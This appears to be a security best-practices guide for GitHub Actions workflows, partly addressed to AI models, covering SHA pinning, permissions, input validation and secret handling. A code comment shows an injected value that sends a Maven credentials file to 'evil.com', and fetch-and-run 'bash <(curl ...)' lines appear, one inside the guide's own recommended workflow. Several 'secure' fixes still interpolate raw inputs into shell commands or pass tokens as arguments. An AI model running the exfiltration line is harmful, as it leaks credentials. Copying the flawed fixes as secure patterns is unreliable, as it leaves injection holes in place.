# GitHub Workflows Security Best Practices

**Skill**: Secure GitHub Actions Workflow Development
**Category**: Security, DevOps, CI/CD
**Level**: Advanced
**Last Updated**: 2025-10-25

---

## Overview

This document provides comprehensive security best practices for developing GitHub Actions workflows. These practices are based on real-world security audits, OSSF guidelines, and lessons learned from supply chain attacks.

**Target Audience**: AI models, developers, security engineers

---

## 🔒 Core Security Principles

### 1. Supply Chain Security

**Principle**: Never trust mutable references in workflows.

#### Action Pinning (CRITICAL)

**❌ INSECURE** - Mutable tags can be changed by attackers:
```yaml
steps:
  - uses: actions/checkout@v4                    # Tag can move
  - uses: aquasecurity/trivy-action@master       # Branch can change
  - uses: softprops/action-gh-release@v1         # Tag can be rewritten
```

**✅ SECURE** - Pin to immutable commit SHAs:
```yaml
steps:
  # actions/checkout@v4.2.2
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

  # aquasecurity/trivy-action@0.28.0
  - uses: aquasecurity/trivy-action@69c4ceb78ce0f6ebbb0ea7c9bc6f9d46423d5d62

  # softprops/action-gh-release@v2.2.0
  - uses: softprops/action-gh-release@da07017b40e28a1a0a35a90e201ca6e05c3dda96
```

**Why This Matters**:
- In 2021, Codecov's Bash uploader was compromised via CI/CD
- Attackers who compromise action repos can move tags to malicious code
- SHA provides cryptographic verification of code integrity

**How to Find Commit SHAs**:
```bash
# Method 1: GitHub CLI
gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq '.object.sha'

# Method 2: Manual
# Go to https://github.com/actions/checkout/releases/tag/v4.2.2
# Click on commit hash → copy full 40-character SHA
```

**Maintenance Strategy**:
```yaml
# Always add semantic version as comment for human readability
# Pattern: # <action>@<semantic-version>
# <action>@<commit-sha>

# actions/checkout@v4.2.2
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

---

### 2. Least Privilege Permissions

**Principle**: Workflows should request only the minimum permissions needed.

#### Explicit Permissions (REQUIRED)

**❌ INSECURE** - Uses default permissions (often too permissive):
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps: [...]
```

**✅ SECURE** - Explicit least-privilege permissions:
```yaml
jobs:
  # Read-only CI job
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read       # Checkout code
      packages: read       # Download artifacts (if needed)
    steps: [...]

  # Release job with write access
  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write      # Create tags, push commits
      packages: write      # Publish packages
    steps: [...]

  # Security scanning job
  security:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write  # Upload SARIF to Security tab
    steps: [...]
```

**Common Permission Scopes**:
| Permission | Read | Write | Use Case |
|------------|------|-------|----------|
| `contents` | Checkout code | Push commits, create tags | Most workflows need read, releases need write |
| `packages` | Download artifacts | Publish packages | CI needs read, deploy needs write |
| `pull-requests` | Read PRs | Comment on PRs | PR automation |
| `security-events` | - | Upload SARIF | Security scanning |
| `issues` | Read issues | Create/update issues | Issue automation |
| `statuses` | - | Create status checks | Custom CI reporting |

**Why This Matters**:
- Limits blast radius if workflow is compromised
- Prevents accidental destructive actions
- Required for some features (e.g., SARIF upload needs `security-events: write`)
- Follows principle of least privilege

---

### 3. Input Validation & Injection Prevention

**Principle**: Never trust user-provided inputs in shell commands.

#### Command Injection Vulnerabilities

**❌ INSECURE** - Direct input to shell:
```yaml
on:
  workflow_call:
    inputs:
      maven-args:
        type: string

jobs:
  build:
    steps:
      - name: Build
        run: mvn clean verify ${{ inputs.maven-args }}
        # Attacker can inject: "&& curl evil.com/exfil?data=$(cat ~/.m2/settings.xml)"
```

**✅ SECURE** - Input validation before use:
```yaml
on:
  workflow_call:
    inputs:
      maven-args:
        type: string

jobs:
  build:
    steps:
      - name: Validate inputs
        run: |
          MAVEN_ARGS="${{ inputs.maven-args }}"

          # Allowlist validation: only safe characters
          if ! echo "$MAVEN_ARGS" | grep -qE '^[-A-Za-z0-9=.,_:/ ]*$'; then
            echo "❌ Invalid maven-args: contains disallowed characters"
            echo "Allowed: alphanumeric, hyphens, equals, dots, commas, underscores, colons, slashes, spaces"
            echo "Provided: $MAVEN_ARGS"
            exit 1
          fi

          echo "✅ Input validation passed"

      - name: Build (safe - inputs validated)
        run: |
          MAVEN_ARGS="${{ inputs.maven-args }}"
          mvn clean verify "$MAVEN_ARGS"
```

**Common Input Patterns**:
```bash
# Maven arguments: -DskipTests, -Drevision=1.0.0
PATTERN='^[-A-Za-z0-9=.,_:/ ]*$'

# CMake options: -DCMAKE_BUILD_TYPE=Release
PATTERN='^[-A-Za-z0-9=.,_:/ ]*$'

# Bazel configs: release,debug,asan
PATTERN='^[a-z,_-]+$'

# Version strings: 1.2.3, 1.2.3-beta
PATTERN='^[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9]+)?$'

# Branch names: main, feature/foo, release-1.0.0
PATTERN='^[a-zA-Z0-9/_.-]+$'
```

**Why This Matters**:
- Prevents arbitrary code execution
- Protects against data exfiltration
- Prevents privilege escalation
- CWE-77: Command Injection

---

### 4. Secret Management

**Principle**: Secrets must never be exposed in logs, process arguments, or error messages.

#### GPG Passphrase Handling

**❌ INSECURE** - Secret in command-line arguments:
```yaml
- name: Sign artifacts
  env:
    GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
  run: |
    mvn deploy -Dgpg.passphrase="$GPG_PASSPHRASE"
    # Visible in: ps aux, logs, error messages, core dumps
```

**✅ SECURE** - Secret in configuration file:
```yaml
- name: Configure GPG settings
  env:
    GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
  run: |
    mkdir -p ~/.m2
    cat > ~/.m2/settings.xml <<EOF
    <settings>
      <profiles>
        <profile>
          <id>gpg-config</id>
          <properties>
            <gpg.passphrase>${GPG_PASSPHRASE}</gpg.passphrase>
          </properties>
        </profile>
      </profiles>
      <activeProfiles>
        <activeProfile>gpg-config</activeProfile>
      </activeProfiles>
    </settings>
    EOF
    chmod 600 ~/.m2/settings.xml

- name: Deploy (GPG passphrase accessed from settings.xml)
  run: mvn deploy
```

#### Secret Scanning Prevention

**✅ Best Practices**:
```yaml
# 1. Always use GitHub Secrets
env:
  API_KEY: ${{ secrets.API_KEY }}  # ✅ Good

# 2. Never hardcode secrets
env:
  API_KEY: "sk-1234567890abcdef"   # ❌ NEVER

# 3. Mask sensitive output
- name: Authenticate
  run: |
    echo "::add-mask::${{ secrets.API_KEY }}"
    curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" ...

# 4. Don't echo secrets
- name: Bad Example
  run: echo "Token is ${{ secrets.TOKEN }}"  # ❌ NEVER

# 5. Use temporary files, not environment variables for large secrets
- name: Import GPG key
  env:
    GPG_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
  run: |
    echo "$GPG_KEY" | gpg --batch --import
    # Key never exposed in process listing
```

**Why This Matters**:
- CWE-214: Invocation of Process Using Visible Sensitive Information
- Secrets in logs can be scraped by attackers
- Process arguments visible to all users on system
- Core dumps may contain secrets

---

### 5. Binary Download Verification

**Principle**: Always verify integrity of downloaded binaries.

#### Checksum Verification

**❌ INSECURE** - No verification:
```yaml
- name: Download tool
  run: |
    wget https://example.com/tool-v1.0.0-linux-amd64
    chmod +x tool-v1.0.0-linux-amd64
    sudo mv tool-v1.0.0-linux-amd64 /usr/local/bin/tool
```

**✅ SECURE** - Checksum verification:
```yaml
- name: Download and verify tool
  run: |
    TOOL_VERSION="1.0.0"
    TOOL_SHA256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    # Download
    wget -O /tmp/tool \
      "https://example.com/tool-v${TOOL_VERSION}-linux-amd64"

    # Verify checksum
    echo "${TOOL_SHA256}  /tmp/tool" | sha256sum --check

    # If checksum matches, install
    sudo mv /tmp/tool /usr/local/bin/tool
    sudo chmod +x /usr/local/bin/tool

    # Verify it works
    tool --version
```

**❌ INSECURE** - Signature verification can be bypassed:
```yaml
# Don't rely solely on PGP signatures without verifying the key
- run: |
    wget https://example.com/tool.tar.gz
    wget https://example.com/tool.tar.gz.sig
    gpg --verify tool.tar.gz.sig  # ❌ Whose key? Verified?
```

**✅ SECURE** - Verify signing key first:
```yaml
- name: Verify and install
  run: |
    # Import known good key
    gpg --keyserver keys.openpgp.org --recv-keys KNOWN_KEY_ID

    # Download
    wget https://example.com/tool.tar.gz
    wget https://example.com/tool.tar.gz.sig

    # Verify signature with known key
    gpg --verify tool.tar.gz.sig tool.tar.gz

    # Extract and install
    tar xzf tool.tar.gz
```

**Why This Matters**:
- Prevents MITM attacks
- Detects compromised downloads
- CWE-494: Download of Code Without Integrity Check
- Real-world example: SolarWinds supply chain attack

---

## 🛡️ Advanced Security Patterns

### Pattern 1: Reusable Validation Action

**Problem**: Repeating validation logic across workflows.

**Solution**: Create a composite action:

```yaml
# .github/actions/validate-input/action.yml
name: 'Validate Input'
description: 'Validates user input against a regex pattern'
inputs:
  value:
    description: 'Value to validate'
    required: true
  pattern:
    description: 'Regex pattern (POSIX extended regex)'
    required: true
  name:
    description: 'Input name for error messages'
    required: true

runs:
  using: composite
  steps:
    - name: Validate
      shell: bash
      run: |
        VALUE="${{ inputs.value }}"
        PATTERN="${{ inputs.pattern }}"
        NAME="${{ inputs.name }}"

        if ! echo "$VALUE" | grep -qE "$PATTERN"; then
          echo "❌ Invalid $NAME: does not match pattern $PATTERN"
          echo "Provided: $VALUE"
          exit 1
        fi

        echo "✅ $NAME validation passed"
```

**Usage**:
```yaml
- uses: ./.github/actions/validate-input
  with:
    value: ${{ inputs.maven-args }}
    pattern: '^[-A-Za-z0-9=.,_:/ ]*$'
    name: 'maven-args'
```

---

### Pattern 2: Secure Matrix Builds

**Problem**: Matrix jobs with different security requirements.

**Solution**: Use conditional permissions:

```yaml
jobs:
  build:
    name: ${{ matrix.type }}
    runs-on: ubuntu-latest
    permissions:
      contents: ${{ matrix.type == 'release' && 'write' || 'read' }}
      packages: ${{ matrix.type == 'release' && 'write' || 'read' }}
    strategy:
      matrix:
        type: [ci, release]
    steps:
      - uses: actions/checkout@...

      - name: Build
        run: ./build.sh

      - name: Release (only for release matrix)
        if: matrix.type == 'release'
        run: ./release.sh
```

---

### Pattern 3: Secrets Rotation Detection

**Problem**: Detecting if secrets need rotation.

**Solution**: Add timestamp validation:

```yaml
- name: Check secret age
  env:
    SECRET_ROTATED_AT: ${{ secrets.SECRET_ROTATED_AT }}
  run: |
    if [ -z "$SECRET_ROTATED_AT" ]; then
      echo "⚠️  Secret rotation date not set"
      exit 0
    fi

    CURRENT=$(date +%s)
    ROTATED=$(date -d "$SECRET_ROTATED_AT" +%s)
    AGE_DAYS=$(( (CURRENT - ROTATED) / 86400 ))

    if [ $AGE_DAYS -gt 90 ]; then
      echo "❌ Secret is $AGE_DAYS days old (> 90 days)"
      echo "Please rotate secrets"
      exit 1
    fi

    echo "✅ Secret age: $AGE_DAYS days"
```

---

### Pattern 4: Dependency Pinning with Renovate/Dependabot

**Problem**: Keeping pinned actions up-to-date.

**Solution**: Use Dependabot (GitHub native):

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"
    commit-message:
      prefix: "chore"
      include: "scope"

    # Group updates
    groups:
      github-actions:
        patterns:
          - "actions/*"
        update-types:
          - "minor"
          - "patch"
```

**Benefits**:
- Automatic PR creation for action updates
- Security vulnerability alerts
- Changelog integration
- Keeps pinned SHAs current

---

## 🔍 Security Validation & Testing

### Automated Security Checks

**Workflow Linting** (`.github/workflows/test_lint.yml`):
```yaml
name: Workflow Security Validation

on:
  push:
    paths: ['.github/workflows/*.yml']
  pull_request:
    paths: ['.github/workflows/*.yml']

jobs:
  security-validation:
    name: Security Checks
    runs-on: ubuntu-latest
    permissions:
      contents: read

    steps:
      - uses: actions/checkout@...

      # Check 1: Unpinned actions
      - name: Check for unpinned actions
        run: |
          UNPINNED=$(grep -rn "uses:.*@v[0-9]$" .github/workflows/ || true)
          UNPINNED_BRANCH=$(grep -rn "uses:.*@\(master\|main\)$" .github/workflows/ || true)

          if [ -n "$UNPINNED" ] || [ -n "$UNPINNED_BRANCH" ]; then
            echo "❌ Found unpinned actions"
            exit 1
          fi

      # Check 2: Hardcoded secrets
      - name: Check for hardcoded secrets
        run: |
          if grep -rE '(password|token|key).*=.*["\x27][^"\x27]{10,}' .github/workflows/; then
            echo "❌ Potential hardcoded secret"
            exit 1
          fi

      # Check 3: Permissions blocks
      - name: Verify permissions blocks
        run: |
          for file in .github/workflows/*.yml; do
            if ! grep -q "permissions:" "$file"; then
              echo "⚠️  Missing permissions: $file"
            fi
          done

      # Check 4: actionlint
      - name: Run actionlint
        run: |
          bash <(curl https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)
          ./actionlint -color -verbose
```

---

## 📋 Security Checklist

### Before Committing Workflow Changes

- [ ] **Action Pinning**
  - [ ] All actions pinned to commit SHAs (40 characters)
  - [ ] Semantic version comment above each action
  - [ ] No `@v[0-9]`, `@master`, or `@main` references

- [ ] **Permissions**
  - [ ] Explicit `permissions:` block on every job
  - [ ] Minimal permissions (read-only by default)
  - [ ] Write permissions only where needed
  - [ ] `security-events: write` for SARIF uploads

- [ ] **Input Validation**
  - [ ] All user-controlled inputs validated
  - [ ] Regex allowlist patterns used
  - [ ] Validation failures exit with error
  - [ ] Clear error messages

- [ ] **Secret Handling**
  - [ ] No secrets in command-line arguments
  - [ ] No secrets in echo statements
  - [ ] Secrets masked where needed
  - [ ] Configuration files protected (chmod 600)

- [ ] **Binary Downloads**
  - [ ] Checksum verification for all downloads
  - [ ] HTTPS URLs only
  - [ ] Versions pinned
  - [ ] Installation to secure locations

- [ ] **Testing**
  - [ ] actionlint passes
  - [ ] yamllint passes
  - [ ] Security validation passes
  - [ ] Manual test trigger successful

---

## 🚨 Common Vulnerabilities & Mitigations

### CVE Examples from Real Workflows

#### 1. CodeQL Action Token Exposure (2023)
**Vulnerability**: GitHub tokens exposed in debug logs.
**Fix**:
```yaml
# ❌ Before
- uses: github/codeql-action/analyze@v2

# ✅ After (with token masking)
- uses: github/codeql-action/analyze@...
  with:
    debug: false  # Never enable in production
```

#### 2. Codecov Bash Uploader (2021)
**Vulnerability**: Compromised uploader script executed arbitrary code.
**Fix**:
```yaml
# ❌ Before
- run: bash <(curl -s https://codecov.io/bash)

# ✅ After (use action, verify SHA)
# codecov/codecov-action@v5.0.7
- uses: codecov/codecov-action@015f24e6818733317a2da2edd6290ab26238649a
```

#### 3. SolarWinds Build System (2020)
**Vulnerability**: Build system compromised, malicious code inserted.
**Mitigation**:
- Pin all actions to SHAs
- Use Dependabot for updates
- Enable security scanning
- Implement SLSA framework

---

## 📚 References & Resources

### Official Documentation
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Using Third-Party Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)
- [Automatic Token Authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication)

### Security Frameworks
- [OSSF Scorecard](https://github.com/ossf/scorecard) - Security scoring for projects
- [SLSA Framework](https://slsa.dev/) - Supply chain security levels
- [OpenSSF Best Practices](https://bestpractices.coreinfrastructure.org/)

### Tools
- [actionlint](https://github.com/rhysd/actionlint) - Workflow linting
- [yamllint](https://yamllint.readthedocs.io/) - YAML validation
- [act](https://github.com/nektos/act) - Local GitHub Actions testing
- [Dependabot](https://docs.github.com/en/code-security/dependabot) - Automated updates

### Known Vulnerabilities
- [CVE Database for GitHub Actions](https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aactions)
- [Supply Chain Security Blog](https://github.blog/category/security/)

---

## 🎓 Training Scenarios

### Exercise 1: Identify Vulnerabilities

Review this workflow and identify all security issues:
```yaml
name: Deploy
on:
  workflow_dispatch:
    inputs:
      environment:
        type: string
      version:
        type: string

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Deploying to ${{ inputs.environment }}"
      - run: |
          wget https://releases.example.com/v${{ inputs.version }}/app
          chmod +x app
          ./app deploy --env=${{ inputs.environment }}
      - run: |
          curl -X POST https://api.example.com/deploy \
            -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" \
            -d "version=${{ inputs.version }}"
```

<details>
<summary>Answers (click to reveal)</summary>

**Issues Found**:
1. ❌ Action not pinned to SHA (`@v4` is mutable)
2. ❌ No permissions block (default too permissive)
3. ❌ No input validation (command injection risk)
4. ❌ Binary download without checksum
5. ❌ Secret in command-line arguments (visible in ps)
6. ❌ Direct use of user input in shell command

**Fixed Version**:
```yaml
name: Deploy
on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [dev, staging, prod]
      version:
        type: string

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read

    steps:
      # actions/checkout@v4.2.2
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

      - name: Validate inputs
        run: |
          VERSION="${{ inputs.version }}"
          if ! echo "$VERSION" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "❌ Invalid version format"
            exit 1
          fi

      - name: Download and verify app
        run: |
          VERSION="${{ inputs.version }}"
          CHECKSUM="abc123..."  # Get from releases page

          wget -O /tmp/app "https://releases.example.com/v${VERSION}/app"
          echo "${CHECKSUM}  /tmp/app" | sha256sum --check
          chmod +x /tmp/app

      - name: Deploy
        run: |
          ENV="${{ inputs.environment }}"
          /tmp/app deploy --env="$ENV"

      - name: Notify deployment
        env:
          API_TOKEN: ${{ secrets.API_TOKEN }}
        run: |
          VERSION="${{ inputs.version }}"
          curl -X POST https://api.example.com/deploy \
            -H "Authorization: Bearer ${API_TOKEN}" \
            -d "version=${VERSION}"
```
</details>

---

## ✅ Compliance & Auditing

### Security Audit Checklist

For security audits, verify:

**Level 1: Critical**
- [ ] All actions pinned to commit SHAs
- [ ] No hardcoded secrets
- [ ] No `@master` or `@main` action references
- [ ] Input validation on all user inputs
- [ ] Explicit permissions on all jobs

**Level 2: High**
- [ ] Binary downloads have checksum verification
- [ ] GPG/secrets not in command-line arguments
- [ ] SARIF uploads have `security-events: write`
- [ ] No command injection vulnerabilities
- [ ] Dependabot configured

**Level 3: Medium**
- [ ] Semantic version comments on pinned actions
- [ ] Appropriate retention policies on artifacts
- [ ] Error handling doesn't expose secrets
- [ ] Matrix builds have correct permissions

**Level 4: Low**
- [ ] Workflow has inline documentation
- [ ] Clear naming conventions
- [ ] Efficient caching strategy
- [ ] Proper use of conditions

---

## 🔄 Maintenance & Updates

### Weekly
- Review Dependabot PRs
- Check security advisories
- Update ACTION_VERSIONS.md reference doc

### Monthly
- Review and update action SHAs if security patches
- Audit secrets rotation schedule
- Review workflow logs for anomalies

### Quarterly
- Comprehensive security audit
- Update security documentation
- Review and test disaster recovery

### Annually
- Full penetration testing
- Third-party security assessment
- Review and update security policies

---

**Last Updated**: 2025-10-25
**Version**: 1.0
**Status**: Production - Active Use

---

**For AI Models**: Apply these principles to every workflow you create or modify. Security is not optional. When in doubt, ask for clarification rather than proceeding with insecure patterns.

**Remember**: A single insecure workflow can compromise the entire repository and downstream consumers. Security is a shared responsibility.
